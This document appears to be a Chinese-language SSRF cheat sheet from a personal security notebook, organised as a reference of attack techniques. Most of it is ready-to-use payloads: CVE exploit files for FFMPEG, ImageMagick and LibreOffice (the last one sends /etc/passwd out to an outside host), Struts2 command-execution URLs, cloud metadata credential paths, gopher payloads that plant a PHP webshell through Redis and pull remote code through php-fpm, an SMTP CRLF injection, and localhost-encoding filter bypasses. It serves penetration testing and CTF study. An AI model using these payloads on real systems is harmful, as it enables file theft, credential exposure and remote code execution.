# SSRF (Server Side Request Forgery)
[TOC]
###### tags: `Security` `Web`

利用能接觸到的伺服器，接觸到內網資源
跟 LFI / RFI 的差別在於 SSRF 是發出 Request， LFI / RFI 是包含文件
# Reference
[SSRF Bible](https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/edit)

# Where
## 常見參數名稱
- url, link, proxy, target, host
- URL 預覽、分享
- 網址上傳
- 資源引用

## Other
### XXE
外部實體、參數實體
參考 [XXE (XML External Entity)](https://hackmd.io/@WildfootW/HkBxU2bhH)

### FFMPEG CVE-2016-1897/98
```
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
concat:http://gg.tw/a.m3u8|file:///etc/passwd
#EXT-X-ENDLIST
```

### Database 內建函數
#### Postgresql dblink_send_query

### ImageMagick CVE-2016-3718
- 可以發送 HTTP 或 FTP Request
    - payload: ssrf.mvg
    ```
    push graphic-context
    viewbox 0 0 640 480
    fill 'url(http://example.com/)'
    pop graphic-context
    ```
    - `$ convert ssrf.mvg out.png`

## 判斷方法
### HTTP Access Log
看自己的伺服器是否有收到 Request
有可能對方的防火牆有檔 http 對外

### DNS Log
大部分的防火牆不會檔 DNS 查詢

### 返回內容
透過 Banner, Title, Content 等資訊來辨認


## Intranet IP Range
- `127.0.0.1/8`
- `10.0.0.0/8`
- `172.16.0.0/12`
- `192.168.0.0/16`


# Payloads
[cujanovic SSRF-Testing](https://github.com/cujanovic/SSRF-Testing)


# Attacks
## XSPA
- port scan
    - `127.0.0.1:80` => OK
    - `127.0.0.1:87` => Timeout
    - `127.0.0.1:9487` => Timeout

## 本地利用
目標可以參考 [LFI](https://hackmd.io/@WildfootW/Bk_8tZ4sS)
### file protocol
- `file:///etc/passwd`
- `file://localhost/etc/passwd`
- `curl file://google.com/etc/passwd`
    - 新版已修掉
    - 實測libcurl 7.47可work
### Java 原生可列目錄
- `file:///var/www/html/`
- `netdoc:///var/www/html/`

### Python
- `local_file:///etc/passwd`
### Perl/Ruby open Command Injection
    
### Libreoffice CVE-2018-6871
- 可以使用`WEBSERVICE`讀本地檔案，e.g.`/etc/passwd`
- 讀出來可以用http往外傳
    - `=COM.MICROSOFT.WEBSERVICE(&quot;http://kaibro.tw/&quot;&amp;COM.MICROSOFT.WEBSERVICE(&quot;/etc/passwd&quot;))`
    - e.g. DCTF 2018 final, FBCTF 2019
- Example Payload: [Link](https://github.com/w181496/CTF/blob/master/fbctf2019/pdfme/flag.fods)


## 遠程利用
各個軟體支援的 protocol
![](https://i.imgur.com/XIqB3zX.png)
各個 protocol 可以模擬的 protocol
![](https://i.imgur.com/I6Y77r9.png)

### Protocol 們的使用方法
#### Gopher Protocol
* 模擬其他 Protocol
    ![](https://i.imgur.com/xQw7C19.png)
    - `%0d%0a` => `\r\n`
    - Padding 可以是任意

#### dict Protocol
* fingerprint
    往回送 Request ，會出現目標主機使用的軟體，z.B.libcurl 7.54.0
```
dict://evil.com:5566

$ nc -vl 5566
Listening on [0.0.0.0] (family 0, port 5278)
Connection from [x.x.x.x] port 5566 [tcp/*] accepted (family 2, sport 40790)
CLIENT libcurl 7.35.0

-> libcurl version
```
* Redis

#### sftp Protocol
* fingerprint
```
sftp://evil.com:5566

$ nc -vl 5566
Listening on [0.0.0.0] (family 0, port 5278)
Connection from [x.x.x.x] port 5278 [tcp/*] accepted (family 2, sport 40810)
SSH-2.0-libssh2_1.4.2

-> ssh version
```

### Struts2 s2-016 (HTTP)
- `action:`、`redirect:`、`redirectAction:`
```
http://10.0.2.87/index.do?redirect:${new java.lang.ProcessBuilder('id').start()}
```
### Struts2 s2-057 (HTTP)
```
http://10.0.2.87/$%7B233*233%7D/actionChain1.action
```
### ElasticSearch CVE-2015-3337 (HTTP)
```
http://10.0.2.87:9200/_plugin/head/../../../../etc/passwd
```
### Cloud Metadata (HTTP)
[cloud_metadata.txt](https://gist.github.com/BuffaloWill/fa96693af67e3a3dd3fb)
```
http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true
```

### Docker API (HTTP)
- Remote api 未授權訪問
- 開一個container，掛載/root/，寫ssh key
- 寫crontab彈shell

### Redis (REdis Serialization Protocol)
- default port: `6379`
- 用 SAVE 寫 webshell
```
FLUSHALL 
SET myshell "<?php system($_GET['cmd']) ?>"
CONFIG SET DIR /www 
CONFIG SET DBFILENAME shell.php 
SAVE
QUIT
```
`gopher://127.0.0.1:6379/_FLUSHALL%0D%0ASET%20myshell%20%22%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%3F%3E%22%0D%0ACONFIG%20SET%20DIR%20%2fwww%2f%0D%0ACONFIG%20SET%20DBFILENAME%20shell.php%0D%0ASAVE%0D%0AQUIT`
- 用 SAVE 寫 SSH Key
- 用 SAVE 寫 crontab

### php-fpm (FastCGI)
- default port: 9000
- example
    - Discuz Pwn
        - 302.php: `<?php
header( "Location: gopher://127.0.0.1:9000/x%01%01Zh%00%08%00%00%00%01%00%00%00%00%00%00%01%04Zh%00%8b%00%00%0E%03REQUEST_METHODGET%0F%0FSCRIPT_FILENAME/www//index.php%0F%16PHP_ADMIN_VALUEallow_url_include%20=%20On%09%26PHP_VALUEauto_prepend_file%20=%20http://kaibro.tw/x%01%04Zh%00%00%00%00%01%05Zh%00%00%00%00" );`
        - x: `<?php system($_GET['cmd']); ?>`
        - visit: `/forum.php?mod=ajax&action=downremoteimg&message=[img]http://kaibro.tw/302.php?.jpg[/img]`
        
### MySQL (MySQL)
- 無密碼認證可以SSRF
- MySQL Client與Server交互主要分兩階段
    - Connection Phase
    - Command Phase
- `gopher://127.0.0.1:3306/_<PAYLOAD>`
- Tool: https://github.com/undefinedd/extract0r-




# Bypass
## DNS
### DNS Rebinding
- TTL 設很小
- 第二次解析的時候給他內網 ip
```
if(validate_domain($domain)){
    file_get_contents($domain);
}
```
```
A.54.87.54.87.1time.127.0.0.1.forever.rebind.network
36573657.7f000001.rbndr.us
```

## URL
### 127.0.0.1
```
127.0.0.1
localhost
127.0.1
127.1
0.0.0.0
0.0
0
```

### IPv6
```
::1
::127.0.0.1
::ffff:127.0.0.1
::1%1
[::]
ip6-localhost
```

### 不同進位
```
2130706433 (decimal)
0x7f000001
017700000001
0x7f.0x0.0x0.0x1
0177.0.0.1
0177.01.01.01
0x7f.1
```

### Unicode Ⓐ Ⓑ Ⓒ Ⓓ
```
http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ
```

### domain
```
127.0.0.1.xip.io
foo.bar.10.0.0.1.xip.io
```

## 302 Redirect
- 用來繞過 Protocol 限制
```php
<?php
Header("Location: gopher://127.0.0.1:9000/x...");
```

# Others
## CRLF injection

### SMTP

SECCON 2017 SqlSRF:

`127.0.0.1 %0D%0AHELO sqlsrf.pwn.seccon.jp%0D%0AMAIL FROM%3A %3Ckaibrotw%40gmail.com%3E%0D%0ARCPT TO%3A %3Croot%40localhost%3E%0D%0ADATA%0D%0ASubject%3A give me flag%0D%0Agive me flag%0D%0A.%0D%0AQUIT%0D%0A:25/`

## FingerPrint
- Content-Length
    - 送超大Content-length
    - 連線hang住判斷是否為HTTP Service

## UDP
- tftp
    - `tftp://evil.com:5566/TEST`
    - syslog
